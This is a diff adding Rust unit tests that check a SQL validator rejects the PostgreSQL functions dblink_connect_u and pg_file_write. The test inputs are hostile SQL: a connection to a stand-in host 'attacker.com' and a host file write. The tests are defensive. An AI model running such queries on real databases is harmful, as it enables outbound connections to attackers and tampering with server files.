@@ -1542,6 +1542,26 @@ mod tests {
     }
 
     #[test]
+    fn dblink_connect_u_blocked() {
+        // The UNRESTRICTED dblink connect — lets a non-superuser use any
+        // libpq auth method. Denying `dblink_connect` but not `_u` left the
+        // explicit bypass open (2026-05-31 deny-list completion).
+        let err =
+            validate_sql("SELECT dblink_connect_u('myconn', 'host=attacker.com')", &[]).unwrap_err();
+        assert!(matches!(err, SqlValidationError::DisallowedFunction(_)));
+    }
+
+    #[test]
+    fn pg_file_write_blocked() {
+        // adminpack filesystem WRITE — the mutation counterpart to the
+        // already-blocked pg_read_file. Writing/deleting host files is
+        // strictly worse than reading them.
+        let err =
+            validate_sql("SELECT pg_file_write('/tmp/x', 'data', false)", &[]).unwrap_err();
+        assert!(matches!(err, SqlValidationError::DisallowedFunction(_)));
+    }
+
+    #[test]
     fn schema_qualified_pg_catalog_form_is_blocked() {
         // The canonical bypass for a hypothetical search_path-based
         // block: explicitly qualifying with `pg_catalog`. The visitor
